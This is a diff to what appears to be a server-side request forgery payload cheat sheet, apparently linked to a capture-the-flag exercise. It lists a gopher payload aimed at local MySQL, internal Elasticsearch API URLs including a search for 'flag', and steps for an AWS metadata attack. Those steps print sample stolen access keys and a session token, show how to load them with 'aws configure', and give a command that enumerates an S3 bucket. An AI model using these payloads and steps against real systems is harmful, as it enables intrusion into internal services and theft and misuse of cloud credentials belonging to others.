@@ -304,19 +304,16 @@ gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
 add more
 ```
 
-Elastic Search (default port:9200/9300:
+Elastic Search APIs (default port:9200/9300):
 ```
-Localhost:
-  http://127.0.0.1:9200 | http://127.0.0.1:9300/
-
-ElasticSearch APIs:
-  http://0:9200/_cluster/settings
-  http://0:9200/_cluster/state
-  http://0:9200/phrack/article/14
-  http://0:9200/_tasks/
-  http://0:9200/_nodes?pretty=true
-  http://0:9200/_mapping
-  http://0:9200/_cat&?pretty=true
+http://0:9200/_search?q={flag, sectalks, 6443 . . .}
+http://0:9200/_cluster/settings
+http://0:9200/_cluster/state
+http://0:9200/_tasks/
+http://0:9200/_nodes?pretty=true
+http://0:9200/_mapping
+http://0:9200/_cat&?pretty=true
+http://0:9200/phrack/article/14
 ```
 
 PHP:
@@ -353,6 +350,9 @@ Info retrieved should contain:
 aws_access_key_id = ASIAJMCBEBJIIGUWFBMA
 aws_secret_access_key = sU0fWBEQj2G0pWLz5phfA5qTD7Q3wg19FpAtVC4f
 aws_session_token = {really long access token string}
+
+You can also configure AWS keys via:
+$ aws configure
 ```
 
 5. Enumerate s3 bucket content: `aws s3 ls s3://ns.agency`  
